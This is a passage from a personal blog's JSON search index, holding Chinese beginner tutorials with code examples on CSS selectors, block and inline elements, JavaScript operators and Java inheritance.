作用：根据元素的id属性值选中一个元素 语法：#id属性值&#123;&#125; 例子：#box&#123;&#125; #red&#123;&#125; */ /* #red&#123; color: red; &#125; */ /* 将 秋水... 和 落霞... 设置为蓝色 类选择器 作用：根据元素的class属性值选中一组元素 语法：.class属性值 */ /* .blue&#123; color: blue; &#125; .abc&#123; font-size: 20px; &#125; */ /* 通配选择器 作用：选中页面中的所有元素 语法: * */ *&#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 class=\"blue abc\"&gt;我是标题&lt;/h1&gt; &lt;p&gt;少小离家老大回&lt;/p&gt; &lt;p&gt;乡音无改鬓毛衰&lt;/p&gt; &lt;p id=\"red\"&gt;儿童相见不相识&lt;/p&gt; &lt;p&gt;笑问客从何处来&lt;/p&gt; &lt;!-- class 是一个标签的属性，它和id类似，不同的是class可以重复使用 可以通过class属性来为元素分组 可以同时为一个元素指定多个class属性 --&gt; &lt;p class=\"blue\"&gt;秋水共长天一色&lt;/p&gt; &lt;p class=\"blue\"&gt;落霞与孤鹜齐飞&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联和块元素","slug":"html-css00017内联和块元素","date":"2020-03-07T14:11:22.000Z","updated":"2020-03-07T14:26:03.261Z","comments":true,"path":"2020/03/07/html-css00017内联和块元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00017内联和块元素/","excerpt":"","text":"内联和块元素 块元素和内联元素 div就是一个块元素 所谓的块元素就是会独占一行的元素,无论他的内容有多少他都会独占一行. 常见的块元素: p h1 h2 h3 ... div这个标签没有任何语义,就是一个纯粹的块元素, 并且不会为它里边的元素设置任何的默认样式 div元素主要用来对页面进行布局的 span是一个内联元素(行内元素) 所谓的行内元素,指的是只占自身大小的元素,不会占用一行. 常见的内联元素: a img iframe span span没有任何的语义,span标签专门用来选中文字, 然后为文字来设置样式. 块元素主要用来做页面布局的,内联元素主要用来选中文本设置样式. 一般情况下只使用块元素去包含内联元素,而不会使用内联元素去包含一个块元素 a元素可以包含任意元素,除了他本身 p元素不可以包含任何块元素 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"background-color:red;\"&gt;我是一个块元素&lt;/div&gt; &lt;span style=\"background-color:blue;\"&gt;我是一个内联元素&lt;/span&gt; &lt;a href=\"#\"&gt; &lt;div&gt;我被a元素包含&lt;/div&gt; &lt;/a&gt; &lt;!-- 错误写法 --&gt; &lt;p&gt; &lt;p&gt;我是错误写法&lt;/p&gt; &lt;/p&gt; &lt;span&gt; &lt;div&gt; 我是错误写法 &lt;/div&gt; &lt;/span&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"CSS语法","slug":"html-css00016CSS语法","date":"2020-03-05T07:11:34.000Z","updated":"2020-03-05T07:19:53.475Z","comments":true,"path":"2020/03/05/html-css00016CSS语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/05/html-css00016CSS语法/","excerpt":"","text":"CSS语法 CSS中的注释，注释中的内容会自动被浏览器所忽略 HTML中的&lt;!----&gt;注释在&lt;style&gt;标签内或css文件中是不能使用的 css注释语法 123/*注释内容*/ CSS的基本语法: 选择器 声明块 1234p&#123; 属性名1:值; 属性名2:值;&#125; 选择器，通过选择器可以选中页面中的指定元素 比如 p 的作用就是选中页面中所有的p元素 声明块，通过声明块来指定要为元素设置的样式 声明块由一个一个的声明组成 声明是一个名值对结构 一个样式名对应一个样式值，名和值之间以:连接，以;结尾 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; p&#123; color: red; font-size: 40px; &#125; h1&#123; color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;我是H1&lt;/h1&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"css简介","slug":"html-css00015css简介","date":"2020-03-04T10:18:17.000Z","updated":"2020-03-04T10:44:14.901Z","comments":true,"path":"2020/03/04/html-css00015css简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/html-css00015css简介/","excerpt":"","text":"css简介 网页分成三个部分： 结构(HTML) 表现(CSS) 行为(JavaScript) CSS 层叠样式表 网页实际上是一个多层的结构，通过CSS可以分别为网页的每一个层来设置样式 而最终我们能看到只是网页的最上边一层 总之一句话，CSS用来设置网页中元素的样式 使用CSS来修改元素的样式 第一种方式(内联样式，行内样式)： 在标签内部通过style属性来设置元素的样式 问题： 使用内联样式，样式只能对一个标签生效， 如果希望影响到多个元素必须在每一个元素中都复制一遍 并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便 注意： 开发时绝对不要使用内联样式 &lt;p style=&quot;color:red; font-size: 60px;&quot;&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;p style=&quot;color: red; font-size: 60px;&quot;&gt;今天天气真不错！&lt;/p&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 我是内联样式 --&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 第二种方式（内部样式表） 将样式编写到head中的style标签里 然后通过CSS的选择器来选中元素并为其设置各种样式 可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用 内部样式表更加方便对样式进行复用 问题： 我们的内部样式表只能对一个网页起作用， 它里边的样式不能跨页面进行复用 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p&#123; color: green; font-size: 50px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;少小离家老大回，乡音无改鬓毛衰&lt;p&gt; &lt;/body&gt;&lt;/html&gt; 第三种方式 （外部样式表） 最佳实践 可以将CSS样式编写到一个外部的CSS文件中, 然后通过link标签来引入外部的CSS文件 外部样式表需要通过link标签进行引入， 意味着只要想使用这些样式的网页都可以对其进行引用 使样式可以在不同页面之间进行复用 将样式编写到外部的CSS文件中，可以使用到浏览器的缓存机制， 从而加快网页的加载速度，提高用户的体验。 例如有一个网站X,一个网站通常有多个页面,如果多个页面共用一个css样式文件时,当用户打开A页面时,需要加载css文件,但当用户打开B页面或C页面时就不需要加载了.这就是缓存 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"./style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; 少小离家老大回，乡音无改鬓毛衰 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; style.css 1234 p&#123; color: green; font-size: 50px;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS条件运算符","slug":"JS00024条件运算符","date":"2020-03-04T09:35:31.000Z","updated":"2020-03-04T09:41:48.361Z","comments":true,"path":"2020/03/04/JS00024条件运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00024条件运算符/","excerpt":"","text":"JS条件运算符 条件运算符也叫三元运算符 语法： 条件表达式?语句1:语句2; 执行的流程： 条件运算符在执行时，首先对条件表达式进行求值， 如果该值为true，则执行语句1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件的表达式的求值结果是一个非布尔值， 会将其转换为布尔值然后在运算 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //false?alert(\"语句1\"):alert(\"语句2\"); var a = 300; var b = 143; var c = 50; //a &gt; b ? alert(\"a大\"):alert(\"b大\"); //获取a和b中的最大值 //var max = a &gt; b ? a : b; //获取a b c 中的大值 //max = max &gt; c ? max : c; //这种写法不推荐使用，不方便阅读 var max = a &gt; b ? (a &gt; c ? a :c) : (b &gt; c ? b : c); //console.log(\"max = \"+max); //\"hello\"?alert(\"语句1\"):alert(\"语句2\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS相等运算符","slug":"JS00023相等运算符","date":"2020-03-04T07:51:43.000Z","updated":"2020-03-04T08:12:42.267Z","comments":true,"path":"2020/03/04/JS00023相等运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00023相等运算符/","excerpt":"","text":"JS相等运算符 相等运算符用来比较两个值是否相等， 如果相等会返回true，否则返回false 使用 == 来做相等运算 当使用==来比较两个值时，如果值的类型不同， 则会自动进行类型转换，将其转换为相同的类型 然后在比较 不相等!= 不相等用来判断两个值是否不相等，如果不相等返回true，否则返回false 使用!=来做不相等运算 不相等也会对变量进行自动的类型转换，如果转换后相等它也会返回false 全等=== - 用来判断两个值是否全等，它和相等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回false 不全等!== - 用来判断两个值是否不全等，和不等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回true 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //console.log(1 == 1); //true var a = 10; //console.log(a == 4); //false //console.log(\"1\" == 1); //true //console.log(true == \"1\"); //true //console.log(null == 0); //false /* * undefined 衍生自 null * 所以这两个值做相等判断时，会返回true */ //console.log(undefined == null); /* * NaN不和任何值相等，包括他本身 */ //console.log(NaN == NaN); //false var b = NaN; //判断b的值是否是NaN //console.log(b == NaN); /* * 可以通过isNaN()函数来判断一个值是否是NaN * 如果该值是NaN则返回true，否则返回false */ //console.log(isNaN(b)); //console.log(10 != 5); //true //console.log(10 != 10); //false //console.log(\"abcd\" != \"abcd\"); //false //console.log(\"1\" != 1);//false //console.log(\"123\" === 123);//false //console.log(null === undefined);//false console.log(1 !== \"1\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS中Unicode编码使用","slug":"JS00022Unicode编码使用","date":"2020-03-04T07:20:38.000Z","updated":"2020-03-04T07:27:01.794Z","comments":true,"path":"2020/03/04/JS00022Unicode编码使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00022Unicode编码使用/","excerpt":"","text":"JS中Unicode编码使用 在JS中使用Unicode编码. 格式: \\u编码(十六进制) 编码一般都是十六进制的 在html中使用unicode编码. 格式: &amp;#编码;(十进制) 后面一定要有分号. 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; /* * 在字符串中使用转义字符输入Unicode编码 * \\u四位编码 */ console.log(\"\\u2620\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!--在网页中使用Unicode编码 &amp;#编码; 这里的编码需要的是10进制 --&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9760;&lt;/h1&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9856;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS关系运算符","slug":"JS00021关系运算符","date":"2020-03-04T06:58:02.000Z","updated":"2020-03-04T07:05:39.386Z","comments":true,"path":"2020/03/04/JS00021关系运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00021关系运算符/","excerpt":"","text":"JS关系运算符 通过关系运算符可以比较两个值之间的大小关系， 如果关系成立它会返回true，如果关系不成立则返回false &gt; 大于号 - 判断符号左侧的值是否大于右侧的值 - 如果关系成立，返回true，如果关系不成立则返回false &gt;= 大于等于 - 判断符号左侧的值是否大于或等于右侧的值 &lt; 小于号 &lt;= 小于等于 非数值的情况 - 对于非数值进行比较时，会将其转换为数字然后在比较 - 如果符号两侧的值都是字符串时，不会将其转换为数字进行比较 而会分别比较字符串中字符的Unicode编码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var result = 5 &gt; 10;//false result = 5 &gt; 4; //true result = 5 &gt; 5; //false result = 5 &gt;= 5; //true result = 5 &gt;= 4; //true result = 5 &lt; 4; //false result = 4 &lt;= 4; //true //console.log(\"result = \"+result); //console.log(1 &gt; true); //false //console.log(1 &gt;= true); //true //console.log(1 &gt; \"0\"); //true //console.log(10 &gt; null); //true //任何值和NaN做任何比较都是false //console.log(10 &lt;= \"hello\"); //false //console.log(true &gt; false); //true //console.log(\"1\" &lt; \"5\"); //true //console.log(\"11\" &lt; \"5\"); //true //比较两个字符串时，比较的是字符串的字符编码 //console.log(\"a\" &lt; \"b\");//true //比较字符编码时是一位一位进行比较 //如果两位一样，则比较下一位，所以借用它来对英文进行排序 //console.log(\"abc\" &lt; \"bcd\");//true //比较中文时没有意义 //console.log(\"戒\" &gt; \"我\"); //true //如果比较的两个字符串型的数字，可能会得到不可预期的结果 //注意：在比较两个字符串型的数字时，一定一定一定要转型 console.log(\"11123123123123123123\" &lt; +\"5\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS赋值运算符","slug":"JS00020赋值运算符","date":"2020-03-04T06:39:30.000Z","updated":"2020-03-04T06:44:47.029Z","comments":true,"path":"2020/03/04/JS00020赋值运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00020赋值运算符/","excerpt":"","text":"JS赋值运算符 = 可以将符号右侧的值赋值给符号左侧的变量 += a += 5 等价于 a = a + 5 -= a -= 5 等价于 a = a - 5 *= a \\*= 5 等价于 a = a \\* 5 /= a /= 5 等价于 a = a / 5 %= a %= 5 等价于 a = a % 5 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var a = 10; //a = a + 5; //a += 5; //a -= 5; //a *= 5; // a = a%3; a %= 3; console.log(\"a = \"+a); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS非布尔值的与或运算","slug":"JS00019非布尔值的与或运算","date":"2020-03-04T06:30:12.000Z","updated":"2020-03-04T06:35:58.138Z","comments":true,"path":"2020/03/04/JS00019非布尔值的与或运算/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00019非布尔值的与或运算/","excerpt":"","text":"JS非布尔值的与或运算 &amp;&amp; || 非布尔值的情况 ​ - 对于非布尔值进行与或运算时， ​ 会先将其转换为布尔值，然后再运算，并且返回原值 ​ - 与运算： ​ - 如果第一个值为true，则必然返回第二个值 ​ - 如果第一个值为false，则直接返回第一个值 - 或运算 ​ - 如果第一个值为true，则直接返回第一个值 ​ - 如果第一个值为false，则返回第二个值 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //true &amp;&amp; true //与运算：如果两个值都为true，则返回后边的 var result = 5 &amp;&amp; 6; //与运算：如果两个值中有false，则返回靠前的false //false &amp;&amp; true result = 0 &amp;&amp; 2; result = 2 &amp;&amp; 0; //false &amp;&amp; false result = NaN &amp;&amp; 0; result = 0 &amp;&amp; NaN; //true || true //如果第一个值为true，则直接返回第一个值 result = 2 || 1; result = 2 || NaN; result = 2 || 0; //如果第一个值为false，则直接返回第二个值 result = NaN || 1; result = NaN || 0; result = \"\" || \"hello\"; result = -1 || \"你好\"; console.log(\"result = \"+result); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS逻辑运算符","slug":"JS00018逻辑运算符","date":"2020-03-04T05:57:47.000Z","updated":"2020-03-04T06:20:25.112Z","comments":true,"path":"2020/03/04/JS00018逻辑运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00018逻辑运算符/","excerpt":"","text":"JS逻辑运算符 JS中为我们提供了三种逻辑运算符 ! 非 - !可以用来对一个值进行非运算 - 所谓非运算就是值对一个布尔值进行取反操作， 变false，false变true - 如果对一个值进行两次取反，它不会变化 - 如果对非布尔值进行元素，则会将其转换为布尔值，然后再取反 所以我们可以利用该特点，来将一个其他的数据类型转换为布尔值 可以为一个任意数据类型取两次反，来将其转换为布尔值， 原理和Boolean()函数一样 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //取反 var a = true; a = !a; console.log(\"a:\" + a); //不会变化 var b = true; console.log(\"b:\" + !!b); var c = 1; console.log(\"c:\" + !!c); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; &amp;&amp; 与 - &amp;&amp;可以对符号两侧的值进行与运算并返回结果 - 运算规则 - 两个值中只要有一个值为false就返回false， 只有两个值都为true时，才会返回true - JS中的“与”属于短路的与， 如果第一个值为false，则不会看第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true &amp;&amp; true; console.log(\"a:\" + a);//true a = true &amp;&amp; false; console.log(\"a:\" + a);//true a = true &amp;&amp; alert(\"我出来了\"); a = false &amp;&amp; alert(\"我不出来了\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; || 或 - ||可以对符号两侧的值进行或运算并返回结果 - 运算规则： - 两个值中只要有一个true，就返回true 如果两个值都为false，才返回false - JS中的“或”属于短路的或 如果第一个值为true，则不会检查第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true || false; console.log(\"a:\" + a); a = false || false; console.log(\"a:\" + a); false || alert(\"我出来了\"); true || alert(\"我不出来\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS自增自减运算符","slug":"JS00017自增自减运算符","date":"2020-03-03T14:12:16.000Z","updated":"2020-03-03T14:30:44.900Z","comments":true,"path":"2020/03/03/JS00017自增自减运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00017自增自减运算符/","excerpt":"","text":"JS自增自减运算符 ++ 分为前++(++a)和后++ (a++) 前++ (++a),先加1,再使用. 后++ (a++),先使用,再加1. -- 分为前-- (--a)和后-- (a--) 前-- (--a),先减1,再使用. 后-- (a--),先使用,再减1. 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = 10; console.log(a++);//10 console.log(++a);//12 var b = 10; console.log(b--);//10 console.log(--b);//8 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS一元运算符","slug":"JS00016一元运算符","date":"2020-03-03T14:02:44.000Z","updated":"2020-03-03T14:10:19.467Z","comments":true,"path":"2020/03/03/JS00016一元运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00016一元运算符/","excerpt":"","text":"JS一元运算符 正号: + 负号: - 如果是非Number,会自动转换为Number类型 1234567891011121314&lt;script&gt; var a = 10; console.log(\"a = \" + -a); console.log(\"a = \" + +a); var str = \"123\"; var b = 1 + +str; console.log(b); b = 124 + -str; console.log(b); &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"hexo常用命令","slug":"hexo常用命令","date":"2020-03-03T12:00:08.000Z","updated":"2020-03-03T12:04:54.837Z","comments":true,"path":"2020/03/03/hexo常用命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/hexo常用命令/","excerpt":"","text":"","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"java继承中方法的覆盖重写","slug":"java00079继承中方法的覆盖重写","date":"2020-03-03T11:27:05.000Z","updated":"2020-03-03T11:48:07.188Z","comments":true,"path":"2020/03/03/java00079继承中方法的覆盖重写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00079继承中方法的覆盖重写/","excerpt":"","text":"java继承中方法的覆盖重写 重写(Override) 概念:在继承关系当中,方法的名称一样,参数列表也一样. 注意事项: 1.必须保证父子类之间方法的名称相同,参数也相同. @Override:写在方法前面,用来检测是不是有效的正确覆盖重写. @Override就算不写只要满足要求,也是正确的方法覆盖重写. 2.子类方法的返回值必须小于等于父类方法的返回值范围 java.lang.Object类是所有类的公共最高父类(祖宗类),java.lang.String就是Object的子类. 3.子类方法的权限必须大于等于父类方法的权限修饰符. public &gt; protected &gt; default &gt; private (default)不是关键字default,而是什么都不写,留空 12345678910111213141516171819202122package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"=============================================\"); zi.show(); /* 100 10 200 100 */ &#125;&#125; 12345678910111213141516171819package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; @Override public void show() &#123; super.show();//保持父类的原内容不变,添加自己的新功能 int num = 10; System.out.println(num); System.out.println(this.num); System.out.println(super.num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java区分子类方法中重名的三种变量","slug":"java00078区分子类方法中重名的三种变量","date":"2020-03-03T06:10:51.000Z","updated":"2020-03-03T06:19:30.597Z","comments":true,"path":"2020/03/03/java00078区分子类方法中重名的三种变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00078区分子类方法中重名的三种变量/","excerpt":"","text":"java区分子类方法中重名的三种变量 局部变量: 直接写成员变量 本类的成员变量: this.成员变量 父类的成员变量: super.成员变量名 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314151617package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; int num = 10; System.out.println(num);//使用局部num System.out.println(this.num);//使用本类num System.out.println(super.num);//使用父类num &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承中成员变量的访问特点","slug":"java00077继承中成员变量的访问特点","date":"2020-03-03T05:53:10.000Z","updated":"2020-03-03T06:05:40.494Z","comments":true,"path":"2020/03/03/java00077继承中成员变量的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00077继承中成员变量的访问特点/","excerpt":"","text":"java继承中成员变量的访问特点 如果父类和子类的成员变量重名. 直接通过子类对象访问成员变量: 子类名.成员变量名(优先使用子类的重名成员变量) 间接通过成员方法访问成员变量: 方法属于A类的方法,就优先使用A类重名的成员变量 在父类和子类中,只要有方法或变量重名的,对象属于A类,就优先使用A类对象重名的变量或方法 1234567891011121314151617package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"===========================\"); fu.show();//100 zi.show();//200; &#125;&#125; 123456789101112public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承格式","slug":"java00076继承格式","date":"2020-03-03T04:52:58.000Z","updated":"2020-03-03T05:08:19.975Z","comments":true,"path":"2020/03/03/java00076继承格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00076继承格式/","excerpt":"","text":"java继承格式 子类定义语法: 123public class 子类名 extends 父类名称&#123; //代码块&#125; 1234567891011package xiaochenyan.top.fuZiLei;public class demo01&#123; public static void main(String[] args) &#123; Teacher xiaoMing = new Teacher(); xiaoMing.setAge(23); xiaoMing.setName(\"XiaoMing\"); xiaoMing.show(); &#125;&#125; 子类会继承父类的公有成员函数或公有变量. 1234567package xiaochenyan.top.fuZiLei;public class Teacher extends YuanGong&#123; Teacher()&#123; show(); &#125;&#125; 父类 1234567891011121314151617181920212223242526272829303132333435363738package xiaochenyan.top.fuZiLei;public class YuanGong&#123; public String name; public int age; public YuanGong(String name, int age) &#123; this.name = name; this.age = age; &#125; public YuanGong() &#123; name = null; age = 0; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //输出公有成员变量 public void show() &#123; System.out.println(\"姓名:\"+name); System.out.println(\"年龄:\"+age); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的概述","slug":"java00075继承的概述","date":"2020-03-03T04:44:09.000Z","updated":"2020-03-03T04:46:28.854Z","comments":true,"path":"2020/03/03/java00075继承的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00075继承的概述/","excerpt":"","text":"java继承的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java小学数学真题","slug":"java00074小学数学真题","date":"2020-03-03T04:25:46.000Z","updated":"2020-03-03T04:36:55.974Z","comments":true,"path":"2020/03/03/java00074小学数学真题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00074小学数学真题/","excerpt":"","text":"java小学数学真题 计算从-10.8到5.9之间,绝对值大于6或者小于2.1的整数有多少个? 12345678910111213141516171819package xiaochenyan.top.Demo;public class Main21&#123; public static void main(String[] args) &#123; int count = 0; double min = -10.8; double max = 5.9; for (double i = min; i &lt; max; i++) &#123; double num = Math.ceil(i); double abS = Math.abs(num); if (abS &gt; 6 || abS &lt; 2.1) &#123; ++count; &#125; &#125; 